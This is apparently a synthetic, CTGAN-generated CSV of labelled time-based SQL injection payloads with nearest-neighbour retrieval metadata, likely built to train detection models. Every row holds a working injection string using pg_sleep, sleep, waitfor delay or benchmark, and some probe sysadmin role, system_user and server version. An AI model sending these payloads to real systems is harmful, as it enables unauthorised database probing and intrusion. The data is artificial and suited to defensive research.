id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001637,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.531153061327296
CTGAN_001638,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.128201528890341
CTGAN_001639,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.121222872153497
CTGAN_001640,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.607063253606078
CTGAN_001641,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.504552072472472
CTGAN_001642,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.991557637903951
CTGAN_001643,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.205925323731795
CTGAN_001644,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.305247904829134
CTGAN_001645,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.311647462484277
CTGAN_001646,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,7.077946377904172
CTGAN_001647,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.772323506237808
CTGAN_001648,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.049480432324967
CTGAN_001649,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.16161178809019
CTGAN_001650,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.71937417505761
CTGAN_001651,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,5.881853778707251
CTGAN_001652,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.482230669212952
CTGAN_001653,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.202222831101324
CTGAN_001654,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.362286960599953
CTGAN_001655,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.5689948019758395
CTGAN_001656,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,5.703537353766734
CTGAN_001657,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,7.738500365953923
CTGAN_001658,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.791392908263678
CTGAN_001659,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.962831183549011
CTGAN_001660,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.01354928191223
CTGAN_001661,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.777033038324607
CTGAN_001662,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,4.893725721946335
CTGAN_001663,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.527727385551516
CTGAN_001664,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.218597794521794
CTGAN_001665,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.57839446969034
CTGAN_001666,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.804012817303799
CTGAN_001667,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,8.34842200128376
CTGAN_001668,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.728765415211131
CTGAN_001669,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.864055520536069
CTGAN_001670,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.693884406891586
CTGAN_001671,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.788287618753538
CTGAN_001672,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.841536142888333
CTGAN_001673,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.100555293264818
CTGAN_001674,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.189576340122075
CTGAN_001675,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.383606515427963
CTGAN_001676,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,4.966670779673869
CTGAN_001677,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.624388115183283
CTGAN_001678,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.800396503667762
CTGAN_001679,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.797910339214776
CTGAN_001680,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.934841802231864
CTGAN_001681,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.874485870134656
CTGAN_001682,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.996170086443128
CTGAN_001683,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.879591192013574
CTGAN_001684,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,4.73165184279882
CTGAN_001685,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,7.453104513075237
CTGAN_001686,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.36939896234403
CTGAN_001687,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.304552269927307
CTGAN_001688,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.994338548679682
CTGAN_001689,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.397772050241487
CTGAN_001690,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.434194727938302
CTGAN_001691,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.170058418610104
CTGAN_001692,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.038332034022672
CTGAN_001693,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.971378939156734
CTGAN_001694,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,9.51051886857948
CTGAN_001695,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,7.068458664498238
CTGAN_001696,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.590287495337652
CTGAN_001697,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.672646817669605
CTGAN_001698,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.77803224236264
CTGAN_001699,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.332575893681736
CTGAN_001700,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.143280869646451
CTGAN_001701,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.111119510623538
CTGAN_001702,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.909155149448851
CTGAN_001703,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,6.643268015512467
CTGAN_001704,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.871854537632862
CTGAN_001705,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.499403287493666
CTGAN_001706,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,4.395405572974955
CTGAN_001707,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,6.720109912410261
CTGAN_001708,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.6524147463490415
CTGAN_001709,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.201776480986901
CTGAN_001710,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.684437567699542
CTGAN_001711,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,5.922756666712405
CTGAN_001712,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.035862725636795
CTGAN_001713,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,5.981043337556985
CTGAN_001714,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.706990650176848
CTGAN_001715,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.4990136311860525
CTGAN_001716,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.225853815248942
CTGAN_001717,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.5464609749577845
CTGAN_001718,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,8.454928269408969
CTGAN_001719,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.360187645689589
CTGAN_001720,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.0006837326532105
CTGAN_001721,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.518267815210294
CTGAN_001722,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,3.8191073992504267
CTGAN_001723,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.138920923901077
CTGAN_001724,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.644202138399775
CTGAN_001725,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,8.975005080982184
CTGAN_001726,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.924255125437951
CTGAN_001727,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.1481035773954
CTGAN_001728,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.7455522989436005
CTGAN_001729,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.30879157458897
CTGAN_001730,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.646092434587208
CTGAN_001731,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.04851301198099
CTGAN_001732,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.790684940854211
CTGAN_001733,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.334555865044953
CTGAN_001734,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,7.82087569747162
CTGAN_001735,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,8.284075151239424
CTGAN_001736,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.44623091243255
CTGAN_001737,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.7599462963922985
CTGAN_001738,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.831532355469338
CTGAN_001739,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.396098045935494
CTGAN_001740,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,5.733666457237005
CTGAN_001741,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.0630071646271215
CTGAN_001742,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.1434009137931485
CTGAN_001743,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,4.27157702251774
CTGAN_001744,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.57043747177102
CTGAN_001745,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.457338279239428
CTGAN_001746,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.369588288139751
CTGAN_001747,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.98353084648872
CTGAN_001748,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.518420624718598
CTGAN_001749,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.803078616063803
CTGAN_001750,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.583554980819842
CTGAN_001751,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.427274047234133
CTGAN_001752,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.813101125390505
CTGAN_001753,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.428560308592774
CTGAN_001754,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.776062137678611
CTGAN_001755,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.773885691389214
CTGAN_001756,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.90350289539482
CTGAN_001757,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.108516531173748
CTGAN_001758,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.492466012208773
CTGAN_001759,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,5.433077780662137
CTGAN_001760,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,8.171735223176869
CTGAN_001761,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.042890900172003
CTGAN_001762,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.840412671270383
CTGAN_001763,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,5.293710640134002
CTGAN_001764,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,7.136886094525991
CTGAN_001765,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.656638121604508
CTGAN_001766,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,5.412884787355171
CTGAN_001767,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,5.888347527695191
CTGAN_001768,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.281840935351435
CTGAN_001769,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.369470837633581
CTGAN_001770,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.215409092512899
CTGAN_001771,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.962041350182377
CTGAN_001772,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.734494407872717
CTGAN_001773,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,8.500954613392027
CTGAN_001774,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.5895687363058375
CTGAN_001775,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.776983019901702
CTGAN_001776,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.586202440912452
CTGAN_001777,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.7512206248113795
CTGAN_001778,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.848737240741758
CTGAN_001779,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.830943887608585
CTGAN_001780,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.4706779756443416
CTGAN_001781,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.251536598192613
CTGAN_001782,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,4.768097865424425
CTGAN_001783,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.76953827020714
CTGAN_001784,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.627831350657146
CTGAN_001785,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.002035998739709
CTGAN_001786,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.934816865942873
CTGAN_001787,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.070727769835838
CTGAN_001788,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.83216254406094
CTGAN_001789,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.106474725279798
CTGAN_001790,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.881757818226476
CTGAN_001791,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,8.68089839388979
CTGAN_001792,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.458450544953036
CTGAN_001793,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.669171694750074
CTGAN_001794,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.7698618990202375
CTGAN_001795,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.549957281549982
CTGAN_001796,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.474208500042903
CTGAN_001797,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.7061301168970076
CTGAN_001798,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.2262290355731755
CTGAN_001799,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.842492164674795
CTGAN_001800,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.011911845033392
CTGAN_001801,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.137715138295711
CTGAN_001802,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,7.588948214867926
CTGAN_001803,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,7.834986925966333
CTGAN_001804,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.245553556880163
CTGAN_001805,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.822049818413261
CTGAN_001806,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.863896722286852
CTGAN_001807,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.815561932150336
CTGAN_001808,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,6.82462423638176
CTGAN_001809,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,4.494208561568605
CTGAN_001810,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.516857913051928
CTGAN_001811,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.693335939246797
CTGAN_001812,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,7.248365570609449
CTGAN_001813,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.038099607914308
CTGAN_001814,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.193177512614489
CTGAN_001815,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.414956047923836
CTGAN_001816,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.956482250323543
CTGAN_001817,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.750344905293229
CTGAN_001818,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.64900459833065
CTGAN_001819,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.530239481125837
CTGAN_001820,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.303466869686159
CTGAN_001821,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.436762756848056
CTGAN_001822,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.381447428771658
CTGAN_001823,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.470833849710455
CTGAN_001824,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.43554940693881
CTGAN_001825,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,4.801144806320157
CTGAN_001826,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.814708240493503
CTGAN_001827,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.816010651117368
CTGAN_001828,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.684102193000651
CTGAN_001829,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,6.07699133925763
CTGAN_001830,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.050271904881453
CTGAN_001831,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.773700597901526
CTGAN_001832,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.902059803263417
CTGAN_001833,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,8.371243277165442
CTGAN_001834,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,4.883632392109068
CTGAN_001835,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,7.629093653029727
CTGAN_001836,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.585563191942511
CTGAN_001837,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.564479444822832
CTGAN_001838,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,7.509615026461794
CTGAN_001839,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.063564606613248
CTGAN_001840,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.273754728487295
CTGAN_001841,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.202210116883834
CTGAN_001842,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,6.341258140363039
CTGAN_001843,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.134363798810366
CTGAN_001844,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.648062992082273
CTGAN_001845,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.959235681954317
CTGAN_001846,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.4875369727062395
CTGAN_001847,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,5.482557214209562
CTGAN_001848,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.868352965872402
CTGAN_001849,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,4.247047951301608
CTGAN_001850,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.51225449691101
